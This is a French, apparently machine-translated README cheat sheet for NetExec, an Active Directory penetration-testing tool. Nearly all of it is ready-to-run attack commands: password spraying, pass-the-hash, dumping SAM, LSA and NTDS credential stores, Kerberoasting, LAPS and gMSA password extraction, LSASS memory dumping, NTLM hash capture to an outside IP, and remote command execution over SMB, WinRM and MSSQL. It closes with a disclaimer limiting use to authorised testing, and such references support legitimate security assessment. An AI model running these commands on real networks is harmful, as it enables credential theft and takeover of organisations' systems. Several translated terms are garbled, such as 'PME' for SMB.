<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚡ NetExec (nxc) - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ██╗███████╗████████╗███████╗██╗  ██╗███████╗ ██████╗ 
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝ 
  ██╔██╗ ██║█████╗     ██║   █████╗   ╚███╔╝ █████╗  ██║     
  ██║╚██╗██║██╔══╝     ██║   ██╔══╝   ██╔██╗ ██╔══╝  ██║     
  ██║ ╚████║███████╗   ██║   ███████╗██╔╝ ██╗███████╗╚██████╗ 
  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ 
        The Network Swiss Army Knife (CrackMapExec Successor)
```
<p align="center">
  <img src="https://img.shields.io/badge/NetExec-nxc-blue?style=for-the-badge" alt="NetExec">
  <img src="https://img.shields.io/badge/CME_Successor-Active_Development-green?style=for-the-badge" alt="Successeur CME">
  <img src="https://img.shields.io/badge/Multi_Protocol-SMB_LDAP_MSSQL-orange?style=for-the-badge" alt="Multi-Protocol">
  <img src="https://img.shields.io/badge/Network-Pentesting-red?style=for-the-badge" alt="Pentesting réseau">
</p>

<p align="center">
  <b>🌐 Le successeur officiel et communautaire de CrackMapExec pour l'exploitation du réseau et d'Active Directory</b>
</p>

---

## 📋 Table des matières

- [Introduction](#-introduction)
- [Pourquoi NetExec plutôt que CrackMapExec ?](#-pourquoi-netexec-over-crackmapexec)
- [Installation](#-installation)
- [Protocoles pris en charge](#-protocoles-supportés)
- [Exploitation PME](#-smb-exploitation)
  - [Reconnaissance et énumération de partage](#reconnaissance--share-enumeration)
  -[Pulvérisation de mot de passe et test d'informations d'identification](#password-spraying--credential-testing)
  -[Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)](#pass-the-hash-pth--pass-the-ticket-ptt)
  - [Dumping d'informations d'identification (SAM, LSA, NTDS)](#credential-dumping-sam-lsa-ntds)
  - [Exécution de commande](#command-execution)
- [Exploitation LDAP](#-ldap-exploitation)
  - [Énumération de domaine et politique de mot de passe](#domain-enumeration--password-policy)
  - [AS-REP Rôtissage & Kerberoasting](#as-rep-roasting--kerberoasting)
  -[Extraction LAPS et gMSA](#laps--gmsa-extraction)
  - [Ingestion de données BloodHound](#bloodhound-data-ingestion)
- [Exploitation MSSQL](#-mssql-exploitation)
- [Modules WinRM, RDP et SSH](#-winrm-rdp--ssh-modules)
- [Modules NetExec populaires (`-M`)](#-popular-netexec-modules--m)
- [Espaces de travail et base de données intégrée](#-workspaces--built-in-database)
- [Tableau de référence rapide](#-quick-reference-table)
- [Conseils et bonnes pratiques](#-conseils--meilleures pratiques)
- [Mentions légales](#-legal-disclaimer)
- [Ressources](#-ressources)

---

## 🎯Présentation

**NetExec** (`nxc`) est un outil de post-exploitation polyvalent conçu pour automatiser l'évaluation des grands réseaux Active Directory et Windows. Il s'agit du fork communautaire officiel et actif et de la continuation de **CrackMapExec** (CME), créé après le retrait de CME et archivé par son auteur d'origine.

NetExec agit comme un « couteau suisse » réseau, s'interfaçant de manière transparente avec SMB, LDAP, MSSQL, WinRM, RDP, SSH, FTP et VNC pour automatiser l'authentification, le dumping des informations d'identification, les contrôles de vulnérabilité et les mouvements latéraux.

---

## ⚖️ Pourquoi NetExec plutôt que CrackMapExec ?

| Fonctionnalité | CrackMapExec (CME) | NetExec (nxc) |
|---------|----------|---------------|
| **État de développement** | 🛑 Archivé / Obsolète | 🟢 Maintenu activement |
| **Prise en charge de Python** | Héritage (Python 3.8-3.10) | Python moderne 3.10+ |
| **Prise en charge du protocole** | PME, LDAP, MSSQL, WinRM, SSH | + Améliorations VNC, FTP, RDP, WMI |
| **Assistance BloodHound** | BloodHound Legacy uniquement | BloodHound CE et héritage |
| **Kerberos et PKINIT** | Limité | Prise en charge robuste des tickets PKINIT et Kerberos |
| **Corrections de bugs et modules** | Congelé | Modules CVE et exploit constamment mis à jour |

---

## 📥Installation

### Utilisation de pipx (recommandé)
```bash
pipx install netexec
```
###Kali Linux

NetExec est le remplacement officiel de CrackMapExec dans Kali :
```bash
sudo apt update && sudo apt install -y netexec
```
### Docker
```bash
docker run -it --rm -v ~/.nxc:/root/.nxc ghcr.io/penny-os/netexec:latest smb 10.10.10.0/24
```
### Vérification
```bash
nxc --version
```
---

## 🔌 Protocoles pris en charge

NetExec accepte le protocole cible comme argument principal :
```bash
nxc <protocol> <target(s)> [options]
```
- `nxc smb` - Server Message Block (partages, dumping SAM/LSA/NTDS, exécution de commande)
- `nxc ldap` - Protocole d'accès à l'annuaire léger (Kerberoasting, BloodHound, LAPS)
- `nxc mssql` - Microsoft SQL Server (requêtes de base de données, xp_cmdshell, emprunt d'identité)
- `nxc winrm` - Gestion à distance Windows (exécution furtive de commandes)
- `nxc rdp` - Remote Desktop Protocol (vérification d'authentification, captures d'écran)
- `nxc ssh` - Secure Shell (test et exécution des informations d'identification Linux/UNIX)
- `nxc ftp` / `nxc vnc` - Transfert de fichiers et informatique en réseau virtuel

---

## 🛡️Exploitation des PME

### Reconnaissance et partage d'énumération
```bash
# Discover live hosts and check SMB signing status
nxc smb 10.10.10.0/24

# Enumerate null/anonymous sessions
nxc smb 10.10.10.50 -u '' -p '' --shares
nxc smb 10.10.10.50 -u 'guest' -p '' --shares

# Enumerate readable shares with credentials
nxc smb 10.10.10.0/24 -u 'alice' -p 'Welcome2026!' --shares

# Spider shares for sensitive files (e.g., matching config, password, or bak)
nxc smb 10.10.10.50 -u 'alice' -p 'Welcome2026!' -M spider_plus
```
### Pulvérisation de mots de passe et tests d'informations d'identification
```bash
# Check domain password policy before spraying (Prevents account lockouts!)
nxc smb 10.10.10.1 -u 'alice' -p 'Welcome2026!' --pass-pol

# Password spray a single password against a list of users
nxc smb 10.10.10.1 -u users.txt -p 'SeasonYear2026!' --continue-on-success

# Credential stuffing with user:pass pairs
nxc smb 10.10.10.1 -u users.txt -p passwords.txt --no-bruteforce
```
### Pass-the-Hash (PtH) et Pass-the-Ticket (PtT)
```bash
# Authenticate using NTLM hash
nxc smb 10.10.10.0/24 -u 'Administrator' -H 'fc525c9680e4760a094da0c9ec5f0d94' --local-auth

# Authenticate using Kerberos ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb dc01.corp.local -k --shares
```
### Dumping d'informations d'identification (SAM, LSA, NTDS)
```bash
# Dump local SAM database (Requires administrative privileges)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --sam

# Dump LSA secrets (Service accounts, cleartext passwords)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --lsa

# Dump Active Directory NTDS.dit database via VSS on Domain Controller
nxc smb 10.10.10.1 -u 'Administrator' -p 'Password123' --ntds
```
### Exécution des commandes
```bash
# Execute command via WMI (default)
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami /all'

# Execute command via PowerShell
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -X 'Get-Process'

# Execute command via SMBexec or atexec
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' --exec-method smbexec -x 'ipconfig'
```
---

## 🌳Exploitation LDAP

### Énumération de domaine et politique de mot de passe
```bash
# Dump domain users
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --users

# Dump domain groups and memberships
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --groups

# Check for active domain computers
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --computers
```
### AS-REP Torréfaction et Kerberoasting
```bash
# Identify and dump AS-REP Roastable accounts (DONT_REQ_PREAUTH)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --asreproast asrep_hashes.txt

# Request Kerberos Service Tickets (Kerberoasting)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --kerberoasting kerberoast_hashes.txt
```
### Extraction de LAPS et de gMSA
```bash
# Extract Microsoft LAPS (Local Administrator Password Solution) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M laps

# Dump Group Managed Service Account (gMSA) passwords
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M gmsa
```
### Ingestion de données BloodHound
```bash
# Collect BloodHound data natively over LDAP
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --bloodhound --collection All
```
---

## 🗄️Exploitation MSSQL
```bash
# Test MSSQL authentication across network
nxc mssql 10.10.10.0/24 -u 'sa' -p 'DatabasePassword!'

# Check for privilege escalation via server links
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M enum_links

# Enable xp_cmdshell and execute operating system command
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -x 'whoami'

# Capture NetNTLMv2 hash by triggering xp_dirtree
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M capture-ntlm -o IP=192.168.1.100
```
---

## 🚀Modules WinRM, RDP et SSH

### Exécution de la commande WinRM
```bash
nxc winrm 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami'
```
### Capture d'écran et authentification RDP
```bash
# Check RDP credentials and capture login screenshot
nxc rdp 10.10.10.50 -u 'Administrator' -p 'Pass123' --screenshot
```
### Pulvérisation et commandes SSH
```bash
nxc ssh 10.10.10.0/24 -u 'root' -p 'toor' -x 'id'
```
---

## 🧩 Modules NetExec populaires (`-M`)

| Module | Protocole | Descriptif | Exemple |
|--------|----------|-------------|-------------|
| `spooler` | PME | Vérifiez si le service Print Spooler est en cours d'exécution (PrinterBug) | `nxc smb <IP> -M spooler` |
| `zerologon` | PME | Rechercher la vulnérabilité CVE-2020-1472 | `nxc smb <IP> -M zerologon` |
| `nopac` | PME | Recherchez CVE-2021-42278 / CVE-2021-42287 | `nxc smb <IP> -M nopac` |
| `petitpotam` | PME | Vérifier si l'hôte est vulnérable à la coercition de PetitPotam | `nxc smb <IP> -M petitpotam` |
| `nanodump` | PME | Videz furtivement le minidump de la mémoire LSASS à l'aide de nanodump | `nxc smb <IP> -u admin -p pass -M nanodump` |
| `webdav` | PME | Vérifiez si le service WebClient est actif pour le relais WebDAV | `nxc smb <IP> -M webdav` |
| `laps` | LDAP | Vider les mots de passe LAPS pour les postes de travail | `nxc ldap <IP> -u u -p p -M laps` |
| `gmsa` | LDAP | Extraire les secrets du compte de service géré de groupe | `nxc ldap <IP> -u u -p p -M gmsa` |

---

## 💾 Espaces de travail et base de données intégrée

NetExec enregistre automatiquement tous les hôtes découverts, les informations d'identification valides et les hachages stockés dans une base de données SQLite locale (`~/.nxc/workspaces/`) :
```bash
# View all stored credentials
nxc-database credentials

# View discovered hosts
nxc-database hosts

# Create and switch to a new client engagement workspace
nxc-database workspace create ClientAlpha
nxc-database workspace switch ClientAlpha
```
---

## 📊 Tableau de référence rapide

| Tâche | Protocole | Commande |
|------|----------|---------|
| **Énumérer les partages** | PME | `nxc smb <IP> -u '' -p '' --shares` |
| **Vérifier la politique des laissez-passer** | PME | `nxc smb <DC> -u 'user' -p 'pass' --pass-pol` |
| **Spray de mot de passe** | PME | `nxc smb <IP> -u users.txt -p 'Pass' --continue-on-success` |
| **Passez le hachage** | PME | `nxc smb <IP> -u 'admin' -H <NT_HASH> --local-auth` |
| **Vider SAM** | PME | `nxc smb <IP> -u 'admin' -H <HASH> --sam` |
| **Vider NTDS** | PME | `nxc smb <DC> -u 'admin' -p 'pass' --ntds` |
| **Torréfaction AS-REP** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --asreproast hashes.txt` |
| **Rôtissage de Kerber** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --kerberoasting hashes.txt` |
| **Dump de BloodHound** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --bloodhound --collection All` |
| **MSSQL xp_cmdshell**| MSSQL | `nxc mssql <IP> -u 'sa' -p 'pass' -x 'whoami'` |

---

## 💡 Conseils et bonnes pratiques

1. **Toujours vérifier d'abord la politique de mot de passe :**
   Avant de lancer un spray de mot de passe, exécutez toujours `nxc smb <DC> -u <USER> -p <PASS> --pass-pol` pour inspecter `Account Lockout Threshold`. S'il est réglé sur 3 ou 5, ne vaporisez qu'une fois toutes les 30 minutes et plus pour éviter de verrouiller les comptes de domaine.
2. **Utilisez `--local-auth` pour les postes de travail :**
   Lorsque vous testez les informations d'identification de l'administrateur local sur les postes de travail au lieu des informations d'identification de domaine, incluez toujours l'indicateur `--local-auth`.
3. **Intégration pivotante :**
   NetExec fonctionne de manière transparente sur les proxys SOCKS (par exemple `proxychains nxc smb ...`) ou sur les interfaces Ligolo-ng TUN avec une vitesse native !

---

## ⚠️ Mentions légales

> **IMPORTANT :** NetExec est un outil offensif d'évaluation de la sécurité. Il doit être strictement utilisé sur les réseaux informatiques et les infrastructures de domaine pour lesquels vous avez acquis une autorisation explicite et documentée.

---

## 📚 Ressources

- [Dépôt GitHub officiel NetExec](https://github.com/Pennyw0rth/NetExec)
- [Documentation officielle NetExec](https://www.netexec.wiki/)